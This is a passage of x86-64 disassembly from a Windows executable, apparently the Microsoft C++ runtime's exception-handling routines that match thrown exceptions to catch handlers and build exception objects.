   1400032de:	48 89 48 28          	mov    %rcx,0x28(%rax)
   1400032e2:	e8 f9 31 00 00       	call   0x1400064e0
   1400032e7:	cc                   	int3
   1400032e8:	e8 9b 32 00 00       	call   0x140006588
   1400032ed:	cc                   	int3
   1400032ee:	cc                   	int3
   1400032ef:	cc                   	int3
   1400032f0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400032f5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400032fa:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400032ff:	55                   	push   %rbp
   140003300:	56                   	push   %rsi
   140003301:	57                   	push   %rdi
   140003302:	41 54                	push   %r12
   140003304:	41 55                	push   %r13
   140003306:	41 56                	push   %r14
   140003308:	41 57                	push   %r15
   14000330a:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   140003311:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   140003317:	49 8b e9             	mov    %r9,%rbp
   14000331a:	4d 8b e0             	mov    %r8,%r12
   14000331d:	4c 8b f2             	mov    %rdx,%r14
   140003320:	48 8b f1             	mov    %rcx,%rsi
   140003323:	0f 84 13 02 00 00    	je     0x14000353c
   140003329:	e8 de eb ff ff       	call   0x140001f0c
   14000332e:	44 8b ac 24 30 01 00 	mov    0x130(%rsp),%r13d
   140003335:	00 
   140003336:	44 8b bc 24 28 01 00 	mov    0x128(%rsp),%r15d
   14000333d:	00 
   14000333e:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   140003345:	00 
   140003346:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   14000334b:	74 5b                	je     0x1400033a8
   14000334d:	33 c9                	xor    %ecx,%ecx
   14000334f:	ff 15 a3 bd 00 00    	call   *0xbda3(%rip)        # 0x14000f0f8
   140003355:	48 8b d8             	mov    %rax,%rbx
   140003358:	e8 af eb ff ff       	call   0x140001f0c
   14000335d:	48 39 58 10          	cmp    %rbx,0x10(%rax)
   140003361:	74 45                	je     0x1400033a8
   140003363:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   140003369:	74 3d                	je     0x1400033a8
   14000336b:	81 3e 52 43 43 e0    	cmpl   $0xe0434352,(%rsi)
   140003371:	74 35                	je     0x1400033a8
   140003373:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   14000337a:	00 
   14000337b:	4c 8b cd             	mov    %rbp,%r9
   14000337e:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   140003383:	4d 8b c4             	mov    %r12,%r8
   140003386:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000338b:	49 8b d6             	mov    %r14,%rdx
   14000338e:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140003393:	48 8b ce             	mov    %rsi,%rcx
   140003396:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000339b:	e8 14 f0 ff ff       	call   0x1400023b4
   1400033a0:	85 c0                	test   %eax,%eax
   1400033a2:	0f 85 94 01 00 00    	jne    0x14000353c
   1400033a8:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400033ac:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400033b1:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400033b6:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   1400033ba:	0f 86 97 01 00 00    	jbe    0x140003557
   1400033c0:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400033c5:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400033ca:	4c 8b cd             	mov    %rbp,%r9
   1400033cd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400033d2:	45 8b c7             	mov    %r15d,%r8d
   1400033d5:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   1400033dc:	00 
   1400033dd:	e8 ea f1 ff ff       	call   0x1400025cc
   1400033e2:	0f 10 8c 24 98 00 00 	movups 0x98(%rsp),%xmm1
   1400033e9:	00 
   1400033ea:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1400033ee:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1400033f3:	66 0f 7e c0          	movd   %xmm0,%eax
   1400033f7:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   1400033fd:	3b 84 24 b0 00 00 00 	cmp    0xb0(%rsp),%eax
   140003404:	0f 83 32 01 00 00    	jae    0x14000353c
   14000340a:	44 8b 74 24 78       	mov    0x78(%rsp),%r14d
   14000340f:	66 49 0f 7e c9       	movq   %xmm1,%r9
   140003414:	4c 89 8c 24 00 01 00 	mov    %r9,0x100(%rsp)
   14000341b:	00 
   14000341c:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003421:	48 8b 00             	mov    (%rax),%rax
   140003424:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140003428:	41 8b c6             	mov    %r14d,%eax
   14000342b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000342f:	49 8b 41 08          	mov    0x8(%r9),%rax
   140003433:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140003437:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   14000343c:	49 63 54 00 10       	movslq 0x10(%r8,%rax,1),%rdx
   140003441:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
   140003448:	66 0f 7e c0          	movd   %xmm0,%eax
   14000344c:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   140003453:	00 
   140003454:	41 3b c7             	cmp    %r15d,%eax
   140003457:	0f 8f be 00 00 00    	jg     0x14000351b
   14000345d:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003462:	48 c1 e8 20          	shr    $0x20,%rax
   140003466:	44 3b f8             	cmp    %eax,%r15d
   140003469:	0f 8f ac 00 00 00    	jg     0x14000351b
   14000346f:	48 8b 5d 08          	mov    0x8(%rbp),%rbx
   140003473:	48 83 c3 ec          	add    $0xffffffffffffffec,%rbx
   140003477:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000347c:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003481:	48 c1 e8 20          	shr    $0x20,%rax
   140003485:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003489:	48 8d 14 8a          	lea    (%rdx,%rcx,4),%rdx
   14000348d:	48 03 da             	add    %rdx,%rbx
   140003490:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003494:	74 31                	je     0x1400034c7
   140003496:	4c 63 63 04          	movslq 0x4(%rbx),%r12
   14000349a:	e8 f5 f3 ff ff       	call   0x140002894
   14000349f:	49 03 c4             	add    %r12,%rax
   1400034a2:	74 1b                	je     0x1400034bf
   1400034a4:	45 85 e4             	test   %r12d,%r12d
   1400034a7:	74 0e                	je     0x1400034b7
   1400034a9:	e8 e6 f3 ff ff       	call   0x140002894
   1400034ae:	48 63 4b 04          	movslq 0x4(%rbx),%rcx
   1400034b2:	48 03 c1             	add    %rcx,%rax
   1400034b5:	eb 02                	jmp    0x1400034b9
   1400034b7:	33 c0                	xor    %eax,%eax
   1400034b9:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   1400034bd:	75 5c                	jne    0x14000351b
   1400034bf:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
   1400034c6:	00 
   1400034c7:	f6 03 40             	testb  $0x40,(%rbx)
   1400034ca:	75 4f                	jne    0x14000351b
   1400034cc:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   1400034d3:	00 
   1400034d4:	4c 8b cd             	mov    %rbp,%r9
   1400034d7:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   1400034de:	00 
   1400034df:	4d 8b c4             	mov    %r12,%r8
   1400034e2:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   1400034e7:	48 8b ce             	mov    %rsi,%rcx
   1400034ea:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   1400034ef:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400034f4:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400034fb:	00 
   1400034fc:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140003501:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003506:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000350c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140003511:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003516:	e8 31 f8 ff ff       	call   0x140002d4c
   14000351b:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
   140003522:	00 
   140003523:	41 ff c6             	inc    %r14d
   140003526:	4c 8b 8c 24 00 01 00 	mov    0x100(%rsp),%r9
   14000352d:	00 
   14000352e:	44 3b b4 24 b0 00 00 	cmp    0xb0(%rsp),%r14d
   140003535:	00 
   140003536:	0f 82 e0 fe ff ff    	jb     0x14000341c
   14000353c:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   140003543:	00 
   140003544:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   14000354b:	41 5f                	pop    %r15
   14000354d:	41 5e                	pop    %r14
   14000354f:	41 5d                	pop    %r13
   140003551:	41 5c                	pop    %r12
   140003553:	5f                   	pop    %rdi
   140003554:	5e                   	pop    %rsi
   140003555:	5d                   	pop    %rbp
   140003556:	c3                   	ret
   140003557:	e8 2c 30 00 00       	call   0x140006588
   14000355c:	cc                   	int3
   14000355d:	cc                   	int3
   14000355e:	cc                   	int3
   14000355f:	cc                   	int3
   140003560:	48 8b c4             	mov    %rsp,%rax
   140003563:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003567:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000356b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000356f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003573:	41 56                	push   %r14
   140003575:	48 83 ec 20          	sub    $0x20,%rsp
   140003579:	33 db                	xor    %ebx,%ebx
   14000357b:	4d 8b f0             	mov    %r8,%r14
   14000357e:	48 8b ea             	mov    %rdx,%rbp
   140003581:	48 8b f9             	mov    %rcx,%rdi
   140003584:	39 59 04             	cmp    %ebx,0x4(%rcx)
   140003587:	0f 84 f0 00 00 00    	je     0x14000367d
   14000358d:	48 63 71 04          	movslq 0x4(%rcx),%rsi
   140003591:	e8 fe f2 ff ff       	call   0x140002894
   140003596:	4c 8b c8             	mov    %rax,%r9
   140003599:	4c 03 ce             	add    %rsi,%r9
   14000359c:	0f 84 db 00 00 00    	je     0x14000367d
   1400035a2:	85 f6                	test   %esi,%esi
   1400035a4:	74 0f                	je     0x1400035b5
   1400035a6:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   1400035aa:	e8 e5 f2 ff ff       	call   0x140002894
   1400035af:	48 8d 0c 06          	lea    (%rsi,%rax,1),%rcx
   1400035b3:	eb 05                	jmp    0x1400035ba
   1400035b5:	48 8b cb             	mov    %rbx,%rcx
   1400035b8:	8b f3                	mov    %ebx,%esi
   1400035ba:	38 59 10             	cmp    %bl,0x10(%rcx)
   1400035bd:	0f 84 ba 00 00 00    	je     0x14000367d
   1400035c3:	f6 07 80             	testb  $0x80,(%rdi)
   1400035c6:	74 0a                	je     0x1400035d2
   1400035c8:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   1400035cc:	0f 85 ab 00 00 00    	jne    0x14000367d
   1400035d2:	85 f6                	test   %esi,%esi
   1400035d4:	74 11                	je     0x1400035e7
   1400035d6:	e8 b9 f2 ff ff       	call   0x140002894
   1400035db:	48 8b f0             	mov    %rax,%rsi
   1400035de:	48 63 47 04          	movslq 0x4(%rdi),%rax
   1400035e2:	48 03 f0             	add    %rax,%rsi
   1400035e5:	eb 03                	jmp    0x1400035ea
   1400035e7:	48 8b f3             	mov    %rbx,%rsi
   1400035ea:	e8 b9 f2 ff ff       	call   0x1400028a8
   1400035ef:	48 8b c8             	mov    %rax,%rcx
   1400035f2:	48 63 45 04          	movslq 0x4(%rbp),%rax
   1400035f6:	48 03 c8             	add    %rax,%rcx
   1400035f9:	48 3b f1             	cmp    %rcx,%rsi
   1400035fc:	74 4b                	je     0x140003649
   1400035fe:	39 5f 04             	cmp    %ebx,0x4(%rdi)
   140003601:	74 11                	je     0x140003614
   140003603:	e8 8c f2 ff ff       	call   0x140002894
   140003608:	48 8b f0             	mov    %rax,%rsi
   14000360b:	48 63 47 04          	movslq 0x4(%rdi),%rax
   14000360f:	48 03 f0             	add    %rax,%rsi
   140003612:	eb 03                	jmp    0x140003617
   140003614:	48 8b f3             	mov    %rbx,%rsi
   140003617:	e8 8c f2 ff ff       	call   0x1400028a8
   14000361c:	4c 63 45 04          	movslq 0x4(%rbp),%r8
   140003620:	49 83 c0 10          	add    $0x10,%r8
   140003624:	4c 03 c0             	add    %rax,%r8
   140003627:	48 8d 46 10          	lea    0x10(%rsi),%rax
   14000362b:	4c 2b c0             	sub    %rax,%r8
   14000362e:	0f b6 08             	movzbl (%rax),%ecx
   140003631:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   140003636:	2b ca                	sub    %edx,%ecx
   140003638:	75 07                	jne    0x140003641
   14000363a:	48 ff c0             	inc    %rax
   14000363d:	85 d2                	test   %edx,%edx
   14000363f:	75 ed                	jne    0x14000362e
   140003641:	85 c9                	test   %ecx,%ecx
   140003643:	74 04                	je     0x140003649
   140003645:	33 c0                	xor    %eax,%eax
   140003647:	eb 39                	jmp    0x140003682
   140003649:	b0 02                	mov    $0x2,%al
   14000364b:	84 45 00             	test   %al,0x0(%rbp)
   14000364e:	74 05                	je     0x140003655
   140003650:	f6 07 08             	testb  $0x8,(%rdi)
   140003653:	74 24                	je     0x140003679
   140003655:	41 f6 06 01          	testb  $0x1,(%r14)
   140003659:	74 05                	je     0x140003660
   14000365b:	f6 07 01             	testb  $0x1,(%rdi)
   14000365e:	74 19                	je     0x140003679
   140003660:	41 f6 06 04          	testb  $0x4,(%r14)
   140003664:	74 05                	je     0x14000366b
   140003666:	f6 07 04             	testb  $0x4,(%rdi)
   140003669:	74 0e                	je     0x140003679
   14000366b:	41 84 06             	test   %al,(%r14)
   14000366e:	74 04                	je     0x140003674
   140003670:	84 07                	test   %al,(%rdi)
   140003672:	74 05                	je     0x140003679
   140003674:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003679:	8b c3                	mov    %ebx,%eax
   14000367b:	eb 05                	jmp    0x140003682
   14000367d:	b8 01 00 00 00       	mov    $0x1,%eax
   140003682:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003687:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000368c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003691:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140003696:	48 83 c4 20          	add    $0x20,%rsp
   14000369a:	41 5e                	pop    %r14
   14000369c:	c3                   	ret
   14000369d:	cc                   	int3
   14000369e:	cc                   	int3
   14000369f:	cc                   	int3
   1400036a0:	48 8b c4             	mov    %rsp,%rax
   1400036a3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400036a7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400036ab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400036af:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400036b3:	41 56                	push   %r14
   1400036b5:	48 83 ec 50          	sub    $0x50,%rsp
   1400036b9:	48 8b f9             	mov    %rcx,%rdi
   1400036bc:	49 8b f1             	mov    %r9,%rsi
   1400036bf:	49 8b c8             	mov    %r8,%rcx
   1400036c2:	4d 8b f0             	mov    %r8,%r14
   1400036c5:	48 8b ea             	mov    %rdx,%rbp
   1400036c8:	e8 e7 e7 ff ff       	call   0x140001eb4
   1400036cd:	e8 3a e8 ff ff       	call   0x140001f0c
   1400036d2:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400036d9:	00 
   1400036da:	b9 29 00 00 80       	mov    $0x80000029,%ecx
   1400036df:	ba 26 00 00 80       	mov    $0x80000026,%edx
   1400036e4:	83 78 40 00          	cmpl   $0x0,0x40(%rax)
   1400036e8:	75 38                	jne    0x140003722
   1400036ea:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   1400036f0:	74 30                	je     0x140003722
   1400036f2:	39 0f                	cmp    %ecx,(%rdi)
   1400036f4:	75 10                	jne    0x140003706
   1400036f6:	83 7f 18 0f          	cmpl   $0xf,0x18(%rdi)
   1400036fa:	75 0e                	jne    0x14000370a
   1400036fc:	48 81 7f 60 20 05 93 	cmpq   $0x19930520,0x60(%rdi)
   140003703:	19 
   140003704:	74 1c                	je     0x140003722
   140003706:	39 17                	cmp    %edx,(%rdi)
   140003708:	74 18                	je     0x140003722
   14000370a:	8b 03                	mov    (%rbx),%eax
   14000370c:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003711:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140003716:	72 0a                	jb     0x140003722
   140003718:	f6 43 24 01          	testb  $0x1,0x24(%rbx)
   14000371c:	0f 85 8f 01 00 00    	jne    0x1400038b1
   140003722:	f6 47 04 66          	testb  $0x66,0x4(%rdi)
   140003726:	0f 84 8e 00 00 00    	je     0x1400037ba
   14000372c:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003730:	0f 84 7b 01 00 00    	je     0x1400038b1
   140003736:	83 bc 24 88 00 00 00 	cmpl   $0x0,0x88(%rsp)
   14000373d:	00 
   14000373e:	0f 85 6d 01 00 00    	jne    0x1400038b1
   140003744:	f6 47 04 20          	testb  $0x20,0x4(%rdi)
   140003748:	74 5d                	je     0x1400037a7
   14000374a:	39 17                	cmp    %edx,(%rdi)
   14000374c:	75 37                	jne    0x140003785
   14000374e:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   140003752:	48 8b d6             	mov    %rsi,%rdx
   140003755:	48 8b cb             	mov    %rbx,%rcx
   140003758:	e8 c7 f2 ff ff       	call   0x140002a24
   14000375d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003760:	0f 8c 6b 01 00 00    	jl     0x1400038d1
   140003766:	3b 43 04             	cmp    0x4(%rbx),%eax
   140003769:	0f 8d 62 01 00 00    	jge    0x1400038d1
   14000376f:	44 8b c8             	mov    %eax,%r9d
   140003772:	48 8b cd             	mov    %rbp,%rcx
   140003775:	48 8b d6             	mov    %rsi,%rdx
   140003778:	4c 8b c3             	mov    %rbx,%r8
   14000377b:	e8 b8 04 00 00       	call   0x140003c38
   140003780:	e9 2c 01 00 00       	jmp    0x1400038b1
   140003785:	39 0f                	cmp    %ecx,(%rdi)
   140003787:	75 1e                	jne    0x1400037a7
   140003789:	44 8b 4f 38          	mov    0x38(%rdi),%r9d
   14000378d:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   140003791:	0f 8c 3a 01 00 00    	jl     0x1400038d1
   140003797:	44 3b 4b 04          	cmp    0x4(%rbx),%r9d
   14000379b:	0f 8d 30 01 00 00    	jge    0x1400038d1
   1400037a1:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   1400037a5:	eb ce                	jmp    0x140003775
   1400037a7:	4c 8b c3             	mov    %rbx,%r8
   1400037aa:	48 8b d6             	mov    %rsi,%rdx
   1400037ad:	48 8b cd             	mov    %rbp,%rcx
   1400037b0:	e8 e3 ec ff ff       	call   0x140002498
   1400037b5:	e9 f7 00 00 00       	jmp    0x1400038b1
   1400037ba:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   1400037be:	75 42                	jne    0x140003802
   1400037c0:	8b 03                	mov    (%rbx),%eax
   1400037c2:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   1400037c7:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   1400037cc:	72 14                	jb     0x1400037e2
   1400037ce:	83 7b 20 00          	cmpl   $0x0,0x20(%rbx)
   1400037d2:	74 0e                	je     0x1400037e2
   1400037d4:	e8 bb f0 ff ff       	call   0x140002894
   1400037d9:	48 63 4b 20          	movslq 0x20(%rbx),%rcx
   1400037dd:	48 03 c1             	add    %rcx,%rax
   1400037e0:	75 20                	jne    0x140003802
   1400037e2:	8b 03                	mov    (%rbx),%eax
   1400037e4:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   1400037e9:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   1400037ee:	0f 82 bd 00 00 00    	jb     0x1400038b1
   1400037f4:	8b 43 24             	mov    0x24(%rbx),%eax
   1400037f7:	c1 e8 02             	shr    $0x2,%eax
   1400037fa:	a8 01                	test   $0x1,%al
   1400037fc:	0f 84 af 00 00 00    	je     0x1400038b1
   140003802:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003808:	75 6e                	jne    0x140003878
   14000380a:	83 7f 18 03          	cmpl   $0x3,0x18(%rdi)
   14000380e:	72 68                	jb     0x140003878
   140003810:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   140003817:	76 5f                	jbe    0x140003878
   140003819:	48 8b 47 30          	mov    0x30(%rdi),%rax
   14000381d:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   140003821:	74 55                	je     0x140003878
   140003823:	e8 80 f0 ff ff       	call   0x1400028a8
   140003828:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   14000382c:	4c 8b d0             	mov    %rax,%r10
   14000382f:	48 63 51 08          	movslq 0x8(%rcx),%rdx
   140003833:	4c 03 d2             	add    %rdx,%r10
   140003836:	74 40                	je     0x140003878
   140003838:	0f b6 8c 24 98 00 00 	movzbl 0x98(%rsp),%ecx
   14000383f:	00 
   140003840:	4c 8b ce             	mov    %rsi,%r9
   140003843:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000384a:	4d 8b c6             	mov    %r14,%r8
   14000384d:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003851:	48 8b d5             	mov    %rbp,%rdx
   140003854:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000385b:	00 
   14000385c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003861:	48 8b cf             	mov    %rdi,%rcx
   140003864:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003868:	49 8b c2             	mov    %r10,%rax
   14000386b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003870:	ff 15 ea b9 00 00    	call   *0xb9ea(%rip)        # 0x14000f260
   140003876:	eb 3e                	jmp    0x1400038b6
   140003878:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000387f:	00 
   140003880:	4c 8b ce             	mov    %rsi,%r9
   140003883:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003888:	4d 8b c6             	mov    %r14,%r8
   14000388b:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140003892:	48 8b d5             	mov    %rbp,%rdx
   140003895:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003899:	48 8b cf             	mov    %rdi,%rcx
   14000389c:	8a 84 24 98 00 00 00 	mov    0x98(%rsp),%al
   1400038a3:	88 44 24 28          	mov    %al,0x28(%rsp)
   1400038a7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400038ac:	e8 6f f5 ff ff       	call   0x140002e20
   1400038b1:	b8 01 00 00 00       	mov    $0x1,%eax
   1400038b6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400038bb:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400038c0:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400038c5:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400038ca:	48 83 c4 50          	add    $0x50,%rsp
   1400038ce:	41 5e                	pop    %r14
   1400038d0:	c3                   	ret
   1400038d1:	e8 b2 2c 00 00       	call   0x140006588
   1400038d6:	cc                   	int3
   1400038d7:	cc                   	int3
   1400038d8:	e9 c3 fd ff ff       	jmp    0x1400036a0
   1400038dd:	cc                   	int3
   1400038de:	cc                   	int3
   1400038df:	cc                   	int3
   1400038e0:	40 53                	rex push %rbx
   1400038e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400038e6:	48 8b d9             	mov    %rcx,%rbx
   1400038e9:	48 8b c2             	mov    %rdx,%rax
   1400038ec:	48 8d 0d 2d ca 00 00 	lea    0xca2d(%rip),%rcx        # 0x140010320
   1400038f3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400038f6:	48 89 0b             	mov    %rcx,(%rbx)
   1400038f9:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400038fd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003901:	0f 11 02             	movups %xmm0,(%rdx)
   140003904:	e8 87 07 00 00       	call   0x140004090
   140003909:	48 8d 05 40 ca 00 00 	lea    0xca40(%rip),%rax        # 0x140010350
   140003910:	48 89 03             	mov    %rax,(%rbx)
   140003913:	48 8b c3             	mov    %rbx,%rax
   140003916:	48 83 c4 20          	add    $0x20,%rsp
   14000391a:	5b                   	pop    %rbx
   14000391b:	c3                   	ret
   14000391c:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140003921:	48 8d 05 38 ca 00 00 	lea    0xca38(%rip),%rax        # 0x140010360
   140003928:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000392c:	48 8d 05 1d ca 00 00 	lea    0xca1d(%rip),%rax        # 0x140010350
   140003933:	48 89 01             	mov    %rax,(%rcx)
   140003936:	48 8b c1             	mov    %rcx,%rax
   140003939:	c3                   	ret
   14000393a:	cc                   	int3
   14000393b:	cc                   	int3
   14000393c:	40 53                	rex push %rbx
   14000393e:	48 83 ec 20          	sub    $0x20,%rsp
   140003942:	48 8b d9             	mov    %rcx,%rbx
   140003945:	48 8b c2             	mov    %rdx,%rax
   140003948:	48 8d 0d d1 c9 00 00 	lea    0xc9d1(%rip),%rcx        # 0x140010320
   14000394f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003952:	48 89 0b             	mov    %rcx,(%rbx)
   140003955:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140003959:	48 8d 48 08          	lea    0x8(%rax),%rcx
   14000395d:	0f 11 02             	movups %xmm0,(%rdx)
   140003960:	e8 2b 07 00 00       	call   0x140004090
   140003965:	48 8b c3             	mov    %rbx,%rax
   140003968:	48 83 c4 20          	add    $0x20,%rsp
   14000396c:	5b                   	pop    %rbx
   14000396d:	c3                   	ret
   14000396e:	cc                   	int3
   14000396f:	cc                   	int3
   140003970:	48 8d 05 a9 c9 00 00 	lea    0xc9a9(%rip),%rax        # 0x140010320
   140003977:	48 89 01             	mov    %rax,(%rcx)
   14000397a:	48 83 c1 08          	add    $0x8,%rcx
   14000397e:	e9 9d 07 00 00       	jmp    0x140004120
   140003983:	cc                   	int3
   140003984:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003989:	57                   	push   %rdi
   14000398a:	48 83 ec 20          	sub    $0x20,%rsp
   14000398e:	48 8d 05 8b c9 00 00 	lea    0xc98b(%rip),%rax        # 0x140010320
   140003995:	48 8b f9             	mov    %rcx,%rdi
   140003998:	48 89 01             	mov    %rax,(%rcx)
   14000399b:	8b da                	mov    %edx,%ebx
   14000399d:	48 83 c1 08          	add    $0x8,%rcx
   1400039a1:	e8 7a 07 00 00       	call   0x140004120
   1400039a6:	f6 c3 01             	test   $0x1,%bl
   1400039a9:	74 0d                	je     0x1400039b8
   1400039ab:	ba 18 00 00 00       	mov    $0x18,%edx
   1400039b0:	48 8b cf             	mov    %rdi,%rcx
   1400039b3:	e8 f8 a0 00 00       	call   0x14000dab0
   1400039b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400039bd:	48 8b c7             	mov    %rdi,%rax
   1400039c0:	48 83 c4 20          	add    $0x20,%rsp
   1400039c4:	5f                   	pop    %rdi
   1400039c5:	c3                   	ret
   1400039c6:	cc                   	int3
   1400039c7:	cc                   	int3
   1400039c8:	40 53                	rex push %rbx
   1400039ca:	56                   	push   %rsi
   1400039cb:	57                   	push   %rdi
   1400039cc:	41 54                	push   %r12
   1400039ce:	41 55                	push   %r13
   1400039d0:	41 56                	push   %r14
   1400039d2:	41 57                	push   %r15
   1400039d4:	48 83 ec 70          	sub    $0x70,%rsp
   1400039d8:	48 8b f9             	mov    %rcx,%rdi
   1400039db:	45 33 ff             	xor    %r15d,%r15d
   1400039de:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   1400039e3:	44 21 bc 24 b0 00 00 	and    %r15d,0xb0(%rsp)
   1400039ea:	00 
   1400039eb:	4c 21 7c 24 28       	and    %r15,0x28(%rsp)
   1400039f0:	4c 21 bc 24 c8 00 00 	and    %r15,0xc8(%rsp)
   1400039f7:	00 
   1400039f8:	e8 0f e5 ff ff       	call   0x140001f0c
   1400039fd:	4c 8b 68 28          	mov    0x28(%rax),%r13
   140003a01:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   140003a06:	e8 01 e5 ff ff       	call   0x140001f0c
   140003a0b:	48 8b 40 20          	mov    0x20(%rax),%rax
   140003a0f:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   140003a16:	00 
   140003a17:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   140003a1b:	48 89 b4 24 b8 00 00 	mov    %rsi,0xb8(%rsp)
   140003a22:	00 
   140003a23:	48 8b 47 48          	mov    0x48(%rdi),%rax
   140003a27:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003a2c:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   140003a30:	48 8b 47 30          	mov    0x30(%rdi),%rax
